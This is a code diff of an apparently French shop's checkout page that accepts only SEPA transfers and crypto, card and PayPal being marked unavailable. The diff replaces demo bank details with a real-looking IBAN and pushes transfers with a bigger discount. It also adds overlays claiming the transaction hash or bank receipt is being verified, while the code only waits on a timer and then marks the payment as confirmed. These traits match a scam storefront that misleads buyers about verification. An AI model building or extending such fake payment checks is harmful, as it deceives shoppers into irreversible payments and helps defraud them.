@@ -69,6 +69,15 @@
     .disabled{opacity:.5;cursor:not-allowed}
     .disabled .bubble{display:none}
 
+    /* Highlight best: centered RIGHT */
+    .m.best::after{
+      content:"MEILLEUR TARIF";
+      position:absolute; top:50%; right:12px; transform:translateY(-50%);
+      font-size:11px; padding:4px 8px; border-radius:999px;
+      background:#f0f9ff; color:#1e40af; border:1px solid #bfdbfe;
+      pointer-events:none; letter-spacing:.2px; font-weight:700;
+    }
+
     /* Panels */
     .pm{display:none;margin-top:12px;border:1px dashed var(--line);border-radius:12px;background:#fbfdff;padding:12px}
     .pm.show{display:block}
@@ -143,13 +152,30 @@
     .prog{height:6px;background:#eef2ff;border-radius:999px;overflow:hidden}
     .bar{height:100%;width:0;background:linear-gradient(90deg,#60a5fa,#2563eb);transition:width .6s ease}
     .factions{margin-left:auto;display:flex;gap:8px}
-    .tag-ok{font-size:12px;color:#065f46;background:#ecfdf5;border:1px solid #bbf7d0;border-radius:8px;padding:2px 6px}
+    .tag-ok{
+      font-size:12px;color:#065f46;background:#ecfdf5;border:1px solid #bbf7d0;border-radius:8px;
+      padding:2px 6px; display:inline-flex; align-items:center; justify-content:center; /* centré */
+      min-width:48px; text-align:center;
+    }
 
-    /* Footer */
+    /* Full-screen overlays (verification + success) */
+    .overlay{
+      position:fixed; inset:0; display:none; align-items:center; justify-content:center;
+      background:rgba(15,23,42,.28); backdrop-filter:blur(6px);
+      z-index:20000;
+    }
+    .overlay.show{display:flex}
+    .loader{
+      background:#fff; border:1px solid var(--line); border-radius:14px; padding:18px;
+      width:min(520px,92%); box-shadow:0 18px 38px rgba(0,0,0,.25); text-align:center;
+      display:grid; gap:12px;
+    }
+    .spin{width:38px;height:38px;border:3px solid #e5e7eb;border-top-color:#1e40af;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto}
+    @keyframes spin{to{transform:rotate(360deg)}}
+
     footer{background:#fff;border-top:1px solid var(--line);margin-top:16px}
     .fwrap{max-width:var(--w);margin:0 auto;padding:16px 12px;display:flex;flex-wrap:wrap;gap:10px;justify-content:space-between;align-items:center;font-size:12px}
 
-    /* Mobile */
     @media(max-width:640px){
       .brand .logo{height:26px}
       .nav a span{display:none}
@@ -208,25 +234,27 @@
         <!-- Méthodes de paiement -->
         <div style="margin:14px 0 8px;display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap">
           <div class="title" style="font-size:16px">Mode de paiement</div>
-          <span class="muted">Crypto & Virement — Carte & PayPal indisponibles</span>
+          <span class="muted">Virement & Crypto — Carte & PayPal indisponibles</span>
         </div>
 
         <div class="methods" role="tablist">
-          <button class="m" role="tab" aria-selected="true" data-method="crypto">
+          <!-- VIREMENT EN PREMIER + avantage -->
+          <button class="m best" role="tab" aria-selected="true" data-method="sepa">
+            <div class="mlabel"><strong>Virement SEPA</strong></div>
+            <div class="logos">
+              <img alt="SEPA" src="https://img.icons8.com/?size=100&id=7IJfqNBSaJ0N&format=png&color=000000">
+              <img alt="IBAN" src="https://img.icons8.com/?size=100&id=PpOkzOgNS2tV&format=png&color=000000">
+            </div>
+            <span class="bubble">Promo -3%</span>
+          </button>
+
+          <!-- Crypto ensuite -->
+          <button class="m" role="tab" aria-selected="false" data-method="crypto">
             <div class="mlabel"><strong>Crypto</strong></div>
             <div class="logos">
               <img alt="Bitcoin" src="https://cdn.simpleicons.org/bitcoin">
               <img alt="Ethereum" src="https://cdn.simpleicons.org/ethereum">
               <img alt="Tether" src="https://cdn.simpleicons.org/tether">
-            </div>
-            <span class="bubble">Promo -2%</span>
-          </button>
-
-          <button class="m" role="tab" aria-selected="false" data-method="sepa">
-            <div class="mlabel"><strong>Virement SEPA</strong></div>
-            <div class="logos">
-              <img alt="SEPA" src="https://img.icons8.com/?size=100&id=7IJfqNBSaJ0N&format=png&color=000000">
-              <img alt="IBAN" src="https://img.icons8.com/?size=100&id=PpOkzOgNS2tV&format=png&color=000000">
             </div>
             <span class="bubble">Promo -1%</span>
           </button>
@@ -258,63 +286,15 @@
           </button>
         </div>
 
-        <!-- Panneau CRYPTO -->
-        <div id="pmCrypto" class="pm show">
-          <div class="row cols-2">
-            <div>
-              <label for="ccy">Monnaie</label>
-              <select id="ccy">
-                <option value="USDT-BEP20" selected>USDT (BEP20)</option>
-                <option value="USDT-TRC20">USDT (TRC20)</option>
-                <option value="BTC">Bitcoin (BTC)</option>
-                <option value="ETH-ERC20">Ethereum (ERC20)</option>
-              </select>
-            </div>
-            <div>
-              <label for="amountNow">À envoyer maintenant (EUR)</label>
-              <input id="amountNow" readonly value="0">
-            </div>
-          </div>
-
-          <div class="copyline">
-            <div>
-              <label for="wallet">Adresse de paiement</label>
-              <input id="wallet" readonly>
-            </div>
-            <button class="copy" data-copy="#wallet">Copier</button>
-          </div>
-
-          <div class="copyline">
-            <div>
-              <label for="ccyAmt">Montant à envoyer (<span id="ccyLabel">—</span>)</label>
-              <input id="ccyAmt" readonly>
-            </div>
-            <button class="copy" data-copy="#ccyAmt">Copier</button>
-          </div>
-
-          <div>
-            <label for="txid">Identifiant de transaction (TxID / Hash)</label>
-            <input id="txid" placeholder="0x… / bc1… / TX123…" required>
-          </div>
-
-          <div class="qr" aria-label="QR de paiement">
-            <img id="qrImg" alt="QR code paiement" width="220" height="220" decoding="async">
-          </div>
-
-          <div style="display:flex;gap:8px;flex-wrap:wrap">
-            <button id="confirmCrypto" class="btn">J’ai envoyé le paiement</button>
-          </div>
-        </div>
-
-        <!-- Panneau SEPA -->
-        <div id="pmSEPA" class="pm">
+        <!-- Panneau SEPA (par défaut) -->
+        <div id="pmSEPA" class="pm show">
           <div class="row">
             <div class="row cols-2">
-              <div><label>Bénéficiaire</label><input readonly value="GF STORE EU"></div>
-              <div><label>Banque</label><input readonly value="Demo International Bank (FR)"></div>
-              <div><label for="iban">IBAN</label><input id="iban" readonly value="FR76 3000 6000 0112 3456 7890 189"></div>
-              <div><label for="swift">SWIFT/BIC</label><input id="swift" readonly value="DIBLFRPP"></div>
-              <div><label for="vref">Référence</label><input id="vref" readonly></div>
+              <div><label>Noms</label><input readonly value="GF STORE"></div>
+              <div><label>Banque</label><input readonly value="Nirio Banque (FR)"></div>
+              <div><label for="iban">IBAN</label><input id="iban" readonly value="FR76 1652 8001 3100 0091 7161 081"></div>
+              <div><label for="swift">BIC</label><input id="swift" readonly value="SMOEFRP1XXX"></div>
+              <div><label for="vref">Référence</label><input id="vref" readonly placeholder="Nom du client (auto)"></div>
               <div><label for="amountNowBank">À virer maintenant (EUR)</label><input id="amountNowBank" readonly value="0"></div>
             </div>
 
@@ -347,18 +327,69 @@
               </div>
             </div>
 
-            <div style="display:flex;gap:8px;flex-wrap:wrap">
+            <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:center">
               <button class="btn" data-copy="#iban">Copier IBAN</button>
               <button class="btn" data-copy="#swift">Copier BIC</button>
               <button class="btn" data-copy="#vref">Copier Référence</button>
               <button id="confirmBank" class="btn">J’ai effectué le virement</button>
+              <small class="muted">Après vérification, vous pourrez finaliser la commande.</small>
             </div>
+          </div>
+        </div>
+
+        <!-- Panneau CRYPTO -->
+        <div id="pmCrypto" class="pm">
+          <div class="row cols-2">
+            <div>
+              <label for="ccy">Monnaie</label>
+              <select id="ccy">
+                <option value="USDT-BEP20" selected>USDT (BEP20)</option>
+                <option value="USDT-TRC20">USDT (TRC20)</option>
+                <option value="BTC">Bitcoin (BTC)</option>
+                <option value="ETH-ERC20">Ethereum (ERC20)</option>
+              </select>
+            </div>
+            <div>
+              <label for="amountNow">À envoyer maintenant (EUR)</label>
+              <input id="amountNow" readonly value="0">
+            </div>
+          </div>
+
+          <div class="copyline">
+            <div>
+              <label for="wallet">Adresse de paiement</label>
+              <input id="wallet" readonly>
+            </div>
+            <button class="copy" data-copy="#wallet">Copier</button>
+          </div>
+
+          <div class="copyline">
+            <div>
+              <label for="ccyAmt">Montant à envoyer (<span id="ccyLabel">—</span>)</label>
+              <input id="ccyAmt" readonly>
+            </div>
+            <button class="copy" data-copy="#ccyAmt">Copier</button>
+          </div>
+
+          <!-- QR DÉPLACÉ ICI sous “Montant à envoyer” -->
+          <div class="qr" aria-label="QR de paiement">
+            <img id="qrImg" alt="QR code paiement" width="220" height="220" decoding="async">
+          </div>
+
+          <div>
+            <label for="txid">Identifiant de transaction (TxID / Hash)</label>
+            <input id="txid" placeholder="0x… / bc1… / TX123…" required>
+          </div>
+
+          <div style="display:flex;gap:8px;flex-wrap:wrap">
+            <button id="confirmCrypto" class="btn">J’ai envoyé le paiement</button>
+            <small class="muted">Vérification rapide du hash avant finalisation.</small>
           </div>
         </div>
 
         <div style="display:flex;gap:10px;justify-content:flex-end;flex-wrap:wrap;margin-top:12px">
           <a href="index.html" class="btn"><img class="ic" id="icBack" alt=""> Continuer les achats</a>
-          <button id="placeOrder" class="btn primary">Finaliser la commande</button>
+          <button id="placeOrder" class="btn primary" disabled>Finaliser la commande</button>
         </div>
       </div>
     </section>
@@ -413,7 +444,30 @@
     </div>
   </div>
 
+  <!-- Toast -->
   <div id="toast" class="toast" role="status" aria-live="polite"></div>
+
+  <!-- Vérification overlay -->
+  <div id="checkOverlay" class="overlay" aria-hidden="true" role="dialog" aria-modal="true">
+    <div class="loader" role="status" aria-live="polite">
+      <div class="spin" aria-hidden="true"></div>
+      <div id="ovTitle" style="font-weight:700">Vérification…</div>
+      <div id="ovSub" class="muted">Un instant, nous confirmons votre paiement.</div>
+    </div>
+  </div>
+
+  <!-- Succès / Merci overlay -->
+  <div id="doneOverlay" class="overlay" aria-hidden="true" role="dialog" aria-modal="true">
+    <div class="loader" role="status" aria-live="polite">
+      <div style="font-size:42px; line-height:1">✅</div>
+      <div style="font-weight:700; font-size:18px">Merci ! Votre commande est enregistrée</div>
+      <div class="muted">Nous vérifions le paiement et lançons la préparation. Vous recevrez un email de confirmation.</div>
+      <div style="display:flex; gap:8px; justify-content:center; flex-wrap:wrap; margin-top:4px">
+        <a href="index.html" class="btn">Découvrir d’autres produits</a>
+        <a href="compte/index.html" class="btn primary">Voir ma commande</a>
+      </div>
+    </div>
+  </div>
 
   <footer>
     <div class="fwrap">
@@ -458,7 +512,7 @@
     const getCart=()=>{try{return JSON.parse(localStorage.getItem(KEY)||'[]')}catch{return[]}};
     const setCart=arr=>localStorage.setItem(KEY,JSON.stringify(arr));
     const orderId=(()=>{const d=new Date(); const y=String(d.getFullYear()).slice(2); const mm=String(d.getMonth()+1).padStart(2,'0'); const dd=String(d.getDate()).padStart(2,'0'); const rnd=Math.floor(Math.random()*9000)+1000; return `GF-${y}${mm}${dd}-${rnd}`;})();
-    $('#orderId').textContent=orderId; $('#vref').value='GF-'+orderId;
+    $('#orderId').textContent=orderId;
 
     // Panier -> récap
     function computeSub(cart){ return cart.reduce((s,x)=> s + Number(x.price||0)*Number(x.qty||1), 0); }
@@ -477,8 +531,8 @@
     }
 
     // Méthodes / promos
-    function currentPM(){ return document.querySelector('.m[role="tab"][aria-selected="true"]')?.dataset.method || 'crypto'; }
-    function promoRate(){ return currentPM()==='crypto'?0.02 : currentPM()==='sepa'?0.01 : 0; }
+    function currentPM(){ return document.querySelector('.m[role="tab"][aria-selected="true"]')?.dataset.method || 'sepa'; }
+    function promoRate(){ return currentPM()==='sepa'?0.03 : currentPM()==='crypto'?0.01 : 0; }
 
     // Taux mock (affichage montant crypto)
     const fx={
@@ -488,7 +542,7 @@
       'ETH-ERC20':{symbol:'ETH',rate:3000}
     };
 
-    // TES ADRESSES + QR (réels)
+    // Adresses crypto + QR
     const WALLET={
       'USDT-BEP20':{
         address:'0x5f1e4fdef890dba03ebfcba79a77aa0ea432f04b',
@@ -553,9 +607,16 @@
     $('#closeSplit').addEventListener('click',closeModal);
     $('#cancelSplit').addEventListener('click',closeModal);
     $('#applySplit').addEventListener('click',()=>{ selectedSplit=modalParts; $('#btnSplit').classList.add('on'); $('#btnOnce').classList.remove('on'); closeModal(); updateSplitHint(); updateSummary(); });
-    $('#btnOnce').addEventListener('click',()=>{ selectedSplit=1; $('#btnOnce').classList.add('on'); $('#btnSplit').classList.remove('on'); updateSplitHint(); updateSummary(); });
-    $('#btnSplit').addEventListener('click',openModal);
-    updateSplitHint();
+
+    // Référence courte basée sur le nom
+    const slugRefFromName = (n)=>{
+      const base=(n||'').normalize('NFD').replace(/[\u0300-\u036f]/g,'').toUpperCase().replace(/[^A-Z0-9]+/g,'').slice(0,16);
+      if(base) return base;
+      const short=orderId.replace('GF-','').split('-')[0];
+      return 'GF'+short;
+    };
+    const syncRef=()=>{ const name=$('#name')?.value||''; $('#vref').value=slugRefFromName(name); };
+    $('#name').addEventListener('input', syncRef);
 
     // Récap global
     const SHIPPING=0;
@@ -593,20 +654,52 @@
       }
     }
 
-    // Init
-    renderMini(); updateSummary();
-    setCryptoAddress($('#ccy').value); // adresse & QR init
+    // Overlays
+    const overlay = document.getElementById('checkOverlay');
+    const ovTitle = document.getElementById('ovTitle');
+    const ovSub = document.getElementById('ovSub');
+    const showOverlay = (title, sub) => {
+      ovTitle.textContent = title || 'Vérification…';
+      ovSub.textContent = sub || 'Un instant, nous confirmons votre paiement.';
+      overlay.classList.add('show'); overlay.setAttribute('aria-hidden','false');
+    };
+    const hideOverlay = () => { overlay.classList.remove('show'); overlay.setAttribute('aria-hidden','true'); };
 
-    // Interactions
+    const doneOverlay = document.getElementById('doneOverlay');
+    const showDone = () => { doneOverlay.classList.add('show'); doneOverlay.setAttribute('aria-hidden','false'); };
+
+    // États de vérification
+    let bankVerified=false, cryptoVerified=false;
+
+    function updateCTA(){
+      const pm=currentPM();
+      const btn=$('#placeOrder');
+      btn.disabled = (pm==='sepa' ? !bankVerified : pm==='crypto' ? !cryptoVerified : false);
+    }
+
+    // Init affichages
+    renderMini(); updateSummary(); updateSplitHint(); setCryptoAddress($('#ccy').value); syncRef(); updateCTA();
+
+    // Interactions tab méthodes
     $$('.m[role="tab"]').forEach(card=>{
       card.addEventListener('click', ()=>{
         $$('.m[role="tab"]').forEach(c=>c.setAttribute('aria-selected', String(c===card)));
         const m=card.dataset.method;
         $('#pmCrypto').classList.toggle('show', m==='crypto');
         $('#pmSEPA').classList.toggle('show', m==='sepa');
+        // reset vérifs quand on change
+        if(m==='sepa'){ cryptoVerified=false; }
+        if(m==='crypto'){ bankVerified=false; }
         updateSummary();
+        updateCTA();
       });
     });
+
+    // Split toggle
+    $('#btnOnce').addEventListener('click',()=>{ selectedSplit=1; $('#btnOnce').classList.add('on'); $('#btnSplit').classList.remove('on'); updateSplitHint(); updateSummary(); });
+    $('#btnSplit').addEventListener('click',()=>{ modal.classList.add('show'); modal.setAttribute('aria-hidden','false'); setModalParts(modalParts); updateModalPreview(); });
+
+    // Crypto change
     $('#ccy').addEventListener('change', ()=>{ setCryptoAddress($('#ccy').value); updateSummary(); });
 
     // Copier
@@ -650,7 +743,7 @@
       fileInfo.textContent=`${f.type || 'Fichier'} • ${fmtBytes(f.size)}`;
       fileBar.style.width='0%'; fileOk.style.display='none';
       fileWrap.style.display='flex';
-      let p=0; const tick=()=>{ p+=Math.random()*35+20; if(p>=100){p=100; fileBar.style.width='100%'; fileOk.style.display='inline-block'; return;} fileBar.style.width=p+'%'; setTimeout(tick,150);} ; setTimeout(tick,150);
+      let p=0; const tick=()=>{ p+=Math.random()*35+20; if(p>=100){p=100; fileBar.style.width='100%'; fileOk.style.display='inline-flex'; return;} fileBar.style.width=p+'%'; setTimeout(tick,150);} ; setTimeout(tick,150);
     }
     function clearFile(){ proofFile=null; input.value=''; fileWrap.style.display='none'; }
     if(removeProof) removeProof.addEventListener('click', clearFile);
@@ -660,18 +753,34 @@
       showFile(f);
     });
 
-    // Confirmer crypto
+    // Confirmer crypto (overlay + déblocage CTA si hash présent)
     document.getElementById('confirmCrypto').addEventListener('click', ()=>{
       if(!validateAddress()) return;
-      if(!document.getElementById('txid').value.trim()){ document.getElementById('txid').focus(); toast('TxID requis.'); return; }
-      toast('Paiement crypto enregistré — validation en cours');
+      const tx = document.getElementById('txid').value.trim();
+      if(!tx){ document.getElementById('txid').focus(); toast('TxID requis.'); return; }
+      showOverlay('Vérification de la transaction crypto…', 'Nous validons le hash fourni.');
+      setTimeout(()=>{
+        hideOverlay();
+        cryptoVerified=true;
+        updateCTA();
+        toast('Transaction enregistrée — vous pouvez finaliser');
+        $('#placeOrder').focus();
+      }, 1400);
     });
 
-    // Confirmer SEPA
+    // Confirmer SEPA (overlay + déblocage CTA)
     document.getElementById('confirmBank').addEventListener('click', ()=>{
       if(!validateAddress()) return;
+      if(!$('#vref').value.trim()){ syncRef(); }
       if(!proofFile){ dz.scrollIntoView({behavior:'smooth',block:'center'}); toast('Preuve de virement requise.'); return; }
-      toast('Preuve envoyée — vérification en cours');
+      showOverlay('Vérification du virement…', 'Nous confirmons la réception auprès de la banque.');
+      setTimeout(()=>{
+        hideOverlay();
+        bankVerified=true;
+        updateCTA();
+        toast('Virement enregistré — vous pouvez finaliser');
+        $('#placeOrder').focus();
+      }, 1600);
     });
 
     // Finaliser la commande
@@ -679,7 +788,8 @@
       if(!validateAddress()) return;
       const cart=getCart(); if(!cart.length){ toast('Votre panier est vide.'); return; }
       const pm=currentPM();
-      if(pm==='crypto' && !document.getElementById('txid').value.trim()){ document.getElementById('txid').focus(); toast('TxID requis pour valider.'); return; }
+      if(pm==='crypto' && !cryptoVerified){ toast('Veuillez terminer la vérification crypto.'); return; }
+      if(pm==='sepa' && !bankVerified){ toast('Veuillez terminer la vérification du virement.'); return; }
 
       const sub=computeSub(cart), promo=sub*promoRate(), total=Math.max(0, sub - promo);
       const order={
@@ -694,7 +804,9 @@
         }
       };
       try{ const all=JSON.parse(localStorage.getItem('gf_orders')||'[]'); all.push(order); localStorage.setItem('gf_orders', JSON.stringify(all)); }catch{}
-      setCart([]); toast('Commande '+orderId+' créée'); setTimeout(()=>location.replace('compte/index.html'), 900);
+
+      setCart([]);
+      showDone(); // écran Merci + CTA “Découvrir d’autres produits” / “Voir ma commande”
     });
 
     // Fermer modal en cliquant le fond
